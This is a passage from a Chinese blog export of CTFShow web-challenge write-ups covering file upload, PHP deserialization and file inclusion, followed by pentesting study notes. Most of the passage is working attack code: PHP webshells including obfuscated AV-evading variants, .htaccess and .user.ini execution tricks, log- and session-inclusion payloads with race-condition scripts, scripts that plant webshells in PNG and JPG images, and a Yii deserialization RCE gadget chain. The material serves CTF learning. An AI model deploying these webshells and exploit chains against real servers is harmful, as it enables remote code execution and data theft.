}`代替\n\n**157**\n\n过滤了分号和花括号，用上面的神奇写法直接执行`<?=(system('tac ../flag.???'))?>` \n\n**158**\n\n同上\n\n**159**\n\nsystem貌似没了，用`<?=nl ``../fl*``?>`\n\n**160**\n\n反引号都没了，只能尝试包含访问日志了\n\n```\n//shell.png\n<?include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?>\n//空格都没给留就离谱\n//User-Agent\n<?php eval($_POST[1]);?>\n```\n\n**161**\n\n增加了对文件头的检测，其余同上\n\n**162**\n\n.和flag被过滤，session文件的竞争包含，隔壁文件包含有原因\n\n```php+HTML\n//.user.ini\nauto_prepend_file=/tmp/sess_kkk\n//1\n<?=include\"/tmp/sess_kkk\"?>\n//POC.html\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"链接\" method=\"POST\" enctype=\"multipart/form-data\">\n    <input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" />\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n```\n\n脚本\n\n```python\nimport requests\nimport threading\n\nsession = requests.session()\nsess = 'j1an'\nurl1 = \"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/\"\nurl2 = \"http://3318481d-34f5-4d86-baa0-5bf6af29a2e9.challenge.ctf.show/upload\"\ndata1 = {\n    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"tac ../f*\");?>'\n}\nfile = {\n    'file': 'j1an'\n}\ncookies = {\n    'PHPSESSID': sess\n}\n\n\ndef write():\n    while True:\n        r = session.post(url1, data=data1, files=file, cookies=cookies)\n\n\ndef read():\n    while True:\n        r = session.get(url2)\n        print(r.text)\n        if 'flag' in r.text:\n            print(r.text)\n\n\nthreads = [threading.Thread(target=write),\n           threading.Thread(target=read)]\nfor t in threads:\n    t.start()\n```\n\n\n\n\n\n**163**\n\n同上\n\n**164**\n\npng图片二次渲染\n\n```\n在php中包含需要渲染的代码时\n```\n\n直接用大佬脚本生成一张图片咯\n\n```PHP\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'kkk.png');  //要修改的图片的路径\n/*\n木马内容\n<?$_GET[0]($_POST[1]);?>\n*/\n?>\n```\n\n**165**\n\njpg图片二次渲染\n\n```php\n<?php\n    $miniPayload = \"<?php system('tac f*');?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n用法  php exp.php a.png\n```\n\n**166**\n\nx-zip-compressed\n\n**167**\n\n提示中为httpd，肯定与apache有关，尝试解析漏洞，上传shell.php.xxx发现执行失败，尝试上传.htaccess\n\n```\n<FilesMatch \"png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n或者\nAddType application/x-httpd-php .png   //将.png后缀的文件解析 成php\n```\n\nOK\n\n**168**\n\n构造免杀木马\n\n```\n<?php\n$a = \"s#y#s#t#e#m\";\n$b = explode(\"#\",$a);\n$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];\n$c($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=substr('1s',1).'ystem';\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=strrev('metsys');\n$a($_REQUEST[1]);\n?>\n```\n\n```\n<?php\n$a=$_REQUEST['a'];\n$b=$_REQUEST['b'];\n$a($b);\n?>\n```\n\n\n\n\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFShow反序列化","url":"/posts/17329.html","content":"\n# 反序列化\n\n序列化的概念：把一个对象转为字符串\n\n序列化的好处：\n\n1、有利于数据存储\n\n2、方便数据传递\n\n序列化后字符串的格式\n\n```\nPublic属性序列化后格式：成员名\nPrivate属性序列化后格式：%00类名%00成员名\nProtect属性序列化后格式：%00*%00成员名\n```\n\nO:对象类名长度:\"对象类名\":对象属性个数{属性名类型:属性名长度:\"属性名字\";属性类型:属性长度:\"属性内容\"}\n\n```php\nPHP序列化与反序列化方法：\n1、__construct 当一个对象被创建时调用\n2、__destruct 当一个对象被销毁时调用\n3、__toString 当一个对象被当作一个字符串时使用\n4、__sleep 在对象被序列化之前运行\n5、__wakeup 在对象被反序列化之后调用\n__construct\n// 触发条件，构造函数，当构造一个对象时调用。\n// 对象创建时销毁\n__destruct\n// 触发条件，析构函数，对象销毁时被调用。\n// 序列化时会销毁一次，对象销毁时执行，序列化输出前运行，但不影响序列化内容\n__unserialize\n// 触发条件，7.4版本以上，反序列化时出发，且可以绕过__wakeup\n__sleep\n// 在对象被序列化之前运行\n__wakeup\n// 在对象被反序列化之后被调用\n__invoke\n// 当对象被调用时执行\n// 函数形式调用对象时，触发的方法\n```\n\n\n\n**254**\n\n```\npayload:?username=xxxxx&password=xxxxx\n```\n\n按照题中全等于直接构造即可\n\n**255-257**\n\n构造就行\n\n**258**\n\n过滤了`O:数字`的形式，在冒号后加+即可，URLdecode会自动解析成连接的\n\n**259**\n\n什么玩意跳过了\n\n```php\n//flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\nif($ip!=='127.0.0.1'){\n\tdie('error');\n}else{\n\t$token = $_POST['token'];\n\tif($token=='ctfshow'){\n\t\tfile_put_contents('flag.txt',$flag);\n\t}\n}\n\n//index.php\n<?php\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n```\n\n灰溜溜的回来看WP\n\n```\n如果调用一个没有定义的方法，那么就会使用类本身的call方法。由于给了个ssrf的代码，那么河里推断这是一个ssrf的原生类。\n```\n\n\n\n```PHP\n//PHP中原生类\nclass SoapClient {\n    /* Methods */\n    public __construct(?string $wsdl, array $options = [])\n    public __call(string $name, array $args): mixed\n    public __doRequest(\n        string $request,\n        string $location,\n        string $action,\n        int $version,\n        bool $oneWay = false\n    ): ?string\n    public __getCookies(): array\n    public __getFunctions(): ?array\n    public __getLastRequest(): ?string\n    public __getLastRequestHeaders(): ?string\n    public __getLastResponse(): ?string\n    public __getLastResponseHeaders(): ?string\n    public __getTypes(): ?array\n    public __setCookie(string $name, ?string $value = null): void\n    public __setLocation(?string $location = null): ?string\n    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool\n    public __soapCall(\n        string $name,\n        array $args,\n        ?array $options = null,\n        SoapHeader|array|null $inputHeaders = null,\n        array &$outputHeaders = null\n    ): mixed\n}\n//可以得知构造SoapClient的类对象的时候，需要有两个参数，字符串$wsdl和数组$options\n```\n\n```php\n在构造SoapClient类时，传入数组参数为：\narray('uri'=>'http://链接','location'=>'http://链接/文件','user_agent'=>'UA头')\n该类的__call方法可构造请求使其对指定URL发起POST请求\n所以构造该类代码如下\n\n\n<?php\n   $ua=\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\";\n   /*相当于构造出以下请求\n   User-Agent: ctfshow\n   x-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\n   Content-Type:application/x-www-form-urlencoded\n   Content-Length:13\n   \n   token=ctfshow\n   */\n   //由于Content-Length已经确定，所以后面该类自行构造的请求头失效\n   $s=new SoapClient(null,array('uri'=>'http://127.0.0.1/','location'=>'http://127.0.0.1/flag.php','user_agent'=>$ua));\n   echo serialize($s);\n?>\n```\n\n**260**\n\n就输入那串字符就行\n\n**261**\n\n知识点：在7.4以上版本反序列化会绕过__wakeup()函数\n\n$this->code==0x36d是弱类型比较，0x36d又有没有打引号，所以代表数字877，构造时使用877开头的文件即可，最终构造内容如下\n\n```PHP\n<?php\n   class ctfshowvip{\n      public $username=\"877.php\";\n      public $password=\"<?php eval(\\$_POST['kkk']);?>\";\n  //这里记得转译，不然会让你传入kkk参数的\n      public $code;\n   }\n   $s=new ctfshowvip();\n   echo serialize($s);\n?>\n//无语Windows Defence把我文件删了😅\n```\n\n**262**\n\n简单轻松解法：\n\n在message.php中直接构造token=admin的类\n\n困难学习解法：\n\n**263**\n\n菜狗直接wp\n\n首先看\n\n```PHP\n//index.php\n$_SESSION['limti']>5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//明显limti写错了，所以这个代码永远执行的是$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n//所以我们就可以控制session中的内容\n```\n\n知识点：session在存储时有两种形式，一种是php，一种是php_serialize\n\n```PHP\n<?php\n\tclass user{\n      public $name=\"jlan\";\n      public $pass=\"123456\";\n  }\n\t$s=new user();\n\t//php存储：user|O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}\n\t//php_serialize存储：a:1:{s:4:\"user\";O:4:\"user\":2:{s:4:\"name\";s:4:\"jlan\";s:4:\"pass\";s:6:\"123456\";}}\n?>\n```\n\n发现诡异的点了吗，在php存储中，｜是用来分离变量名和序列化后的内容的，所以只要我们构造出序列化好的内容并且在前面加｜就可以让程序进行自动反序列化\n\n继续查看inc/inc.php\n\n```PHP\n//inc/inc.php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\n其中包含`file_put_contents`函数可进行一句话木马的写入\n\n最终构造如下\n\n```PHP\nclass User{\n    public $username=\"1.php\";\n    public $password=\"<?php eval(\\$_POST['kkk']);phpinfo();?>\";\n    public $status='1';\n}\n$s=new User();\necho base64_encode('|'.serialize($s));\n```\n\n首先修改cookie访问主页，然后访问/check.php使得木马文件被写入，最后访问/log-1.php即可\n\n264\n\n**265**\n\n地址传参\n\n```PHP\n<?php\nclass ctfshowAdmin{\n   public $token;\n   public $password;\n   public function __construct(){\n       $this->token='a';\n       $this->password = &$this->token;\n\t}\n}\n$a=new ctfshowAdmin();\necho serialize($a);\n?>\n```\n\n**266**\n\n匹配抛出异常后__destrurt不触发，所以使用大小写绕过即可\n\n**267**\n\nyii框架的反序列化漏洞，利用的类\n\n```PHP\nyii\\db\\BatchQueryResult\n    public function __destruct()\n    {\n        // make sure cursor is closed\n        $this->reset();\n    }\n    public function reset()\n    {\n        if ($this->_dataReader !== null) {\n            $this->_dataReader->close();\n        }\n        $this->_dataReader = null;\n        $this->_batch = null;\n        $this->_value = null;\n        $this->_key = null;\n    }\n\n这里的$this->_dataReader内容可控，可以调用不存在close方法并且存在__call方法的类，全局搜索__call方法后，发现在\nyii\\vendor\\fzaninotto\\faker\\src\\Faker\\Generator.php\n    public function __call($method, $attributes)\n    {\n        return $this->format($method, $attributes);\n    }\n跟进format\n    public function format($formatter, $arguments = array())\n    {\n        return call_user_func_array($this->getFormatter($formatter), $arguments);\n    }\n跟进getFormatter\n    public function getFormatter($formatter)\n    {\n        if (isset($this->formatters[$formatter])) {\n            return $this->formatters[$formatter];\n        }\n        foreach ($this->providers as $provider) {\n            if (method_exists($provider, $formatter)) {\n                $this->formatters[$formatter] = array($provider, $formatter);\n                return $this->formatters[$formatter];//这里会返回传入的$formatter的值\n            }\n        }\n        throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));\n    }\n发现format方法中的call_user_func_array的第一个参数可控，想要利用进而查找调用了call_user_func函数的无参方法。发现了IndexAction.php中的run方法\nyii\\rest\\IndexAction.php\n    public function run()\n    {\n        if ($this->checkAccess) {\n            call_user_func($this->checkAccess, $this->id);\n        }\n\n        return $this->prepareDataProvider();\n    }\n在run方法中checkAccess和id都可控，利用链构造成功\n```\n\n利用链\n\n`yii\\db\\BatchQueryResult::__destruct() -> Faker\\Generator::__call() -> yii\\rest\\IndexAction::run()`\n\n```php\npoc\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this->_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n?>\n\n```\n\n","tags":["CTF","web"]},{"title":"CTFshow文件包含","url":"/posts/5550.html","content":"\n# 文件包含\n\n常见的文件包含漏洞函数：include()，require()\n\n### 本地包含\n\n#### 利用方式：\n\n###### 1、php://input：\n\n```\n?file=php://input\n请求体内为PHP代码：<?php phpinfo(); ?>\n```\n\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input，同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n遇到file_get_contents()要想到用php://input绕过。\n\n<!--more-->\n\n###### 2、php://filter：\n\n```\n?file=php://filter/rescource=xxx.php\n以base64编码读取\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。\n\n###### 3、zip://：\n\n```\n?file=zip://[压缩包绝对路径]#[压缩包内文件]\n```\n\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n\n- zip://中只能传入绝对路径。\n- 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23\n- 只需要是zip的压缩包即可，后缀名可以任意更改。\n- 相同的类型的还有zlib://和bzip2://\n\n###### 4、data://：\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\n下面为示例\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n\n###### 5、phar//：\n\n```\n?file=phar://压缩包路径（相对绝对都可）/压缩包内文件\n```\n\n需要phar://有点类似zip://同样可以导致任意代码执行。~~未来的我补一句，这玩意还是乖乖用来反序列化比较好~~\n\n#### 可供包含的内容：\n\n###### 1、包含Apache日志文件：\n\n###### **条件：对日志文件可读并且知道日志文件的存储目录**\n\n**注意事项：**一般情况下日志存储目录被修改，需要读取服务器配置文件（httpd，conf，nginx，conf...）或者根据phpinfo()中的信息来得知。还有就是日志记录的信息都可以被调整，比如记录报错的等级或者内容格式。\n\nApache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。\n\n如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。\n\n可以放在User-Agent中\n\n###### 2、包含SESSION\n\n**条件：**找到Session内的可控变量，并且Session文件可读写，并且知道存储路径，PHP中SESSION文件保存路径可以在phpinfo中看到\n\n**常见路径：**\n\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。\n\n\n###### 3、包含/pros/self/environ\n\n**内容：**proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。\n\n**条件：**php以cgi方式运行，这样environ才会保持UA头。environ文件存储位置已知，且environ文件可读。\n\n###### 4、包含临时文件\n\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\Winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。\n\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。\n\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n\n##### 78\n\n```\npayload:?file=php://filter/convert.base64-encode/resource=flag.php\n```\n\n无过滤直接伪协议读取flag\n\n##### 79\n\n```\npayload:?file=data://text/plain,<?=eval($_POST['cmd']);?>\nPOST\ncmd=system('cat flag.php');\n\npayload:?file=data://text/plain,base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=\n```\n\n过滤了php，可使用data协议，通过再传入一个参数来执行命令，也可base64解码出想执行的命令\n\n##### 80\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了data，可通过包含日志来执行命令\n\n##### 81\n\n```\n?file=/var/log/nginx/access.log\nHEADER\nUser-Agent=<?php eval($_POST[['cmd']]);?>\nPOST\ncmd=system('cat fl0g.php');\n```\n\n过滤了冒号，日志包含依然可行\n\n##### 82\n\n过滤了.，只能包含无后缀文件，在PHP中唯一能控制的无后缀文件就是session文件，所以尝试通过脚本竞争包含写入\n\n```\n原理：在我们自行添加PHPSSEID到网页中时，服务器会自动生成一个文件在/tmp/sess_name，文件名可控。文件内容通过PHP_ SESSION_UPLOAD_PROGRESS参数控制，该参数用于实时获取文件上传进度，会返回一个SESSION，并且该参数的内容将会被加入到sess_name文件中\n方法：一边构造POST文件传输请求，将PHP_SESSION_UPLOAD_PROGRESS包含到请求头中，一边包含/tmp/sess_name文件\n```\n\n##### 83-86\n\n```Python\n# 竞争万能脚本：\n# os.system('rm -rf /bin/Azuki')\n# 消灭Azuki保平安\nimport io\nimport requests\nimport threading\n\nsessID = 'flag'\nurl = 'http://193cefd4-47a6-444e-801b-39906604df13.challenge.ctf.show/'\n\n\ndef write(session):\n    while event.isSet():\n        f = io.BytesIO(b'a' * 1024 * 50)\n        response = session.post(\n            url,\n            cookies={'PHPSESSID': sessID},\n            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"cat *.php\");?>'},\n            files={'file': ('test.txt', f)}\n        )\n\n\ndef read(session):\n    while event.isSet():\n        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))\n        if 'test' in response.text:\n            print(response.text)\n            event.clear()\n        else:\n            print('[*]retrying...')\n\n\nif __name__ == '__main__':\n    event = threading.Event()\n    event.set()\n    with requests.session() as session:\n        for i in range(1, 30):\n            threading.Thread(target=write, args=(session,)).start()\n\n        for i in range(1, 30):\n            threading.Thread(target=read, args=(session,)).start()\n```\n\n**87**\n\n先贴一个[文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)\n\n对于php://filter的使用\n\n简单版本：使用rot13编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n复杂版本：使用base64编解码绕过\n\n```\npayload:?file=php://filter/write=string.rot13/resource=1.php（记得进行两次URL编码）\nPOST:\npbagrag=<?cuc flfgrz('gnp s*.cuc');?>\n<?php system('tac f*.php');?>经过rot13编码\n```\n\n原理：在过滤器进行base64编解码时，会绕过所有不属于base64编码后的字符（+, / , 0~9,a~z,A~Z），比如题中的`<?php die(\"大佬别秀了\");?>`，过滤器识别到的字符只有phpdie，其余的字符被忽略，我们只需要在我们已经编好的base64文本加两个字母即可让phpdiexx被解析为base64编码后语句，与后面代码无关了\n\n**88**\n\n构造语句使得base64编码后只含数字和字母即可\n\n```\npayload:?file=data://text/plain;base64,PD9waHAgICBldmFsKCRfUE9TVFsxXSk7\n//<?php   eval($_POST[1]);\nPOST:\n1=system('tac f*');\n```\n\n","tags":["CTF","web"]},{"title":"小迪","url":"/posts/16397.html","content":"\n# 信息收集\n\n## Day 7 CDN绕过\n\n判断某网站是否使用CDN服务：使用多节点访问，查看返回IP是否相同\n\n#### CDN绕过：\n\n1、子域名查询：xxx.原始域名\n\n子域名查询：https://tool.chinaz.com/subdomain/\n\n2、邮件服务查询：使用邮件服务时大部分不会使用CDN，尝试收取来自该域名的邮件并查看原始邮件标头\n\n3、国外地址请求：针对国内网站，大部分不会开设国外CDN\n\n4、遗留文件，扫描全网：例如phpinfo，探针等，扫描全网使用\n\n5、黑暗搜索引擎搜索特定文件：Shodan，zoomeye，fofa\n\n搜哈希：以网页favicon.ico为例\n\n```python\nimport mmh3\nimport requests\n\nre=requesets.get('地址')\nfav=re.content.encode('base64')\nhas=mh3.hash(fav)\nprint 'http.favicon.hash:'+str(hash)\n```\n\n获得结果后到黑暗引擎中搜索特定内容\n\n6、DNS历史记录\n\n7、~~DDOS打爆~~\n\n8、第三方接口：get-site-ip.com，threatbook.cn\n\n<!--more-->\n\n## DAY 8 架构 搭建 WAF\n\n流程：首先查看是否能获得源码，如果是开源项目可直接去的源码\n\n而后查看服务器的操作系统，搭建平台，数据库类型\n\n进而查看各种站点\n\n最后绕过WAF\n\n攻击目标是否有APP：有的话首先查看是否通过web协议通信，是的话抓取数据包，没有\n\n{% pullquote mindmap mindmap-md %}\n- 信息搜集\n    - 有无web端\n        - 有CDN\n            - 找出真实服务器IP后攻击\n        - 无CDN\n            - 程序源码\n                - 未知CMS\n                - 开源CMS\n        - 服务器信息\n            - 操作系统\n            - 搭建平台\n            - 数据库类型\n        - 站点搭建\n            - 目录站点（从下往上打，只要打通整个根目录下所有站点全部被攻击）\n            - 端口站点\n            - 子域名站点\n            - 旁注站点——同服务器不同站点\n            - C端站点——同网段下不同服务器不同站点\n            - 类似域名站点等\n        - 防护应用WAF——通过脚本嗅探特征\n            - 大部分响应头有X-Powered-By: WAF\n            - 安全狗\n            - 宝塔\n            - 云盾\n            - 安骑士\n    - 有无APP\n        - 走web协议\n            - 抓取数据包走web攻击\n        - 非web协议\n            - 尝试提取\n            - 反编译逆向\n    - 有无其他\n        - 资产信息\n            - 以上各种平台信息\n            - whois备案\n            - github等监控\n        - 第三方应用\n            - 数据库应用\n                - mysql\n                - mssql\n                - oracle\n            - 管理平台\n                - weblogic\n                - phpmyadmin\n            - 第三方应用\n                - vsftpd\n                - nexus\n                - git\n        - 各种服务接口\n            - 存储服务\n            - 支付服务\n            - 内部服务\n        - 微信公众号等位置找到更多的应用\n            - 涉及web\n            - 涉及APP\n            - 涉及其他\n        - 内部群或内部应用等（社工）\n            - QQ或微信群\n            - 工作群\n            - 其他群聊\n\n{% endpullquote %}\n\n## DAY 10 其他资产监控\n\nGitHub监控：便于收集整理最新exp或poc，发现相关测试目标的资产\n\n域名搜集：枚举爆破，利用漏洞，主站爬取，whois查询\n\n\n\n# WEB漏洞\n\n## DAY 11 web漏洞 基础\n\nWEB漏洞类型\n\n{% pullquote mindmap mindmap-md %}\n\n- WEB漏洞\n  - 常见\n    - SQL注入\n      - 危害：获取到隐秘数据，获取管理员账号密码等\n    - 文件上传\n    - XSS跨站\n    - 文件包含\n    - 反序列化\n    - 代码执行\n    - 逻辑安全\n    - 未授权访问\n  - 不常见\n    - CSRF\n    - SSRF\n    - 目录遍历\n      - 产生原因：为方便将需要访问的文件定义成变量，未对传入的文件目录进行过滤，导致某些文件被读取\n      - 危害：服务器中的隐私文件被读取\n      - 攻击方式：扫，往死里扫\n    - 文件读取\n    - 文件下载\n    - 命令执行\n    - XXE安全\n    - 其他\n\n{% endpullquote %}\n\n\n\n## DAY 12，13 web漏洞 SQL注入 简要注入 MySQL注入\n\n**数据库注入基本流程**\n\n首先明确数据库的类型和权限\n\n然后明确提交的方法和参数类型等\n\n注入成功后首先明确数据库记录信息的系统表\n\n然后依次对进行库表列数据进行注入查询\n\n最终目的找到网站后台并登陆尝试获取shell\n\n如果权限较高可通过文件读写，命令执行和注册表读取来getshell\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入\n  - 数据库类型\n    - Access\n    - Mysql\n    - Mssql\n    - Oracle\n    - Postsql\n    - SQLite\n    - Mongodb\n    - 其他\n  - 回显/盲注\n    - 回显注入\n    - 无回显注入\n    - 延时盲注\n    - 布尔盲注\n  - 提交方法\n    - GET\n    - POST\n    - COOKIE\n    - REQUEST\n    - HTTP头\n  - 数据类型\n    - 数字型\n    - 字符型\n    - 搜索型\n  - 查询方式\n    - select\n    - insert\n    - delete\n    - update\n    - order by\n  - 注入拓展\n    - 加解密注入\n    - JSON注入\n    - LADP注入\n    - DNSlog注入\n    - 二次注入\n    - 堆叠查询\n  - WAF绕过\n    - 更改提交方法\n    - 大小写混合\n    - 解密编码类\n    - 注释符混用\n    - 等价函数替换\n    - 特殊符号混用\n    - 借助数据库特性\n    - HTTP参数污染\n    - 垃圾数据溢出\n  - 防御方案\n    - 代码加载过滤\n    - WAF产品部署\n\n{% endpullquote 